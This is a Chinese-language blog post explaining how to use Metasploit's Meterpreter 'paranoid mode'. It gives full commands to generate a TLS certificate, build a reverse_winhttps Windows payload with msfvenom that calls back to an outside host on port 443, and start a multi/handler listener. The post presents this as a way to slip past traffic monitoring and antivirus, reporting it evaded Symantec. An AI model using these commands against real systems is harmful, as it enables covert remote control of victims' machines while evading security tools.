---
layout: post
title:  "MSF偏执模式"
date:   2016-11-23 17:00:01 +0800
categories: MSF
---

* content
{:toc}



在某些环境下，我们需要用到meterpreter的偏执模式(paranoid mode)。

偏执模式在面对接受的请求很多的时候，可以有效过滤筛选回连的请求，只留下自己所需要的。

同时，因为其使用了SSL/TLS 认证，因此在应对流量监控和分析时，有很不错的效果，当然也能够Bypass av(by data stream)。

创建一个SSL/TLS证书
-------------

在kali或者其他带有openssl的环境下：

    $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
        -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=green-m.github.io" \
        -keyout green-m.github.io.key \
        -out green-m.github.io.crt && \
    cat green-m.github.io.key  green-m.github.io.crt > green-m.github.io.pem && \
    rm -f green-m.github.io.key  green-m.github.io.crt

你可以把green-m.github.io这个URL改成任意你想回连的地址，直接指定相应IP也可以。

如果你能搞到一个受信任的证书颁发机构签名的SSL/TLS证书，那就碉堡了，流量直接畅通无阻。

生成偏执模式的payload
--------------

    msfvenom -p windows/meterpreter/reverse_winhttps LHOST=green-m.github.io LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=./green-m.github.io.pem StagerVerifySSLCert=true PayloadUUIDName=Green_m -f exe -o ./Green_m.exe

通过设置PayloadUUIDTracking和PayloadUUIDName可以在监听的时候过滤掉不需要的回连请求。为了Bypass av的需求，你还可以生成shellcode来自己编译。

如果网络环境不好，你还可以使用stageless的payload，-p参数指定windows/meterpreter_reverse_https，其他不用修改。

监听偏执模式
------

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_winhttps
    set LHOST green-m.github.io
    set LPORT 443
    set HandlerSSLCert ./green-m.github.io.pem
    set IgnoreUnknownPayloads true
    set StagerVerifySSLCert true
    set exitonsession false
    run -j -z

设置HandlerSSLCert和StagerVerifySSLCert参数来使用TLS pinning，IgnoreUnknownPayloads接受白名单的payload。

同上，stageless 修改相应payload。

**总结：偏执模式基于SSL/TLS认证过某些流量监控效果应该很不错，测试也过了symantec，仅供参考。**



参考文章：https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode#create-a-ssltls-certificate


转载请注明出处：[https://green-m.github.io/2016/11/23/msf-paranoid-mode/](https://green-m.github.io/2016/11/23/msf-paranoid-mode/)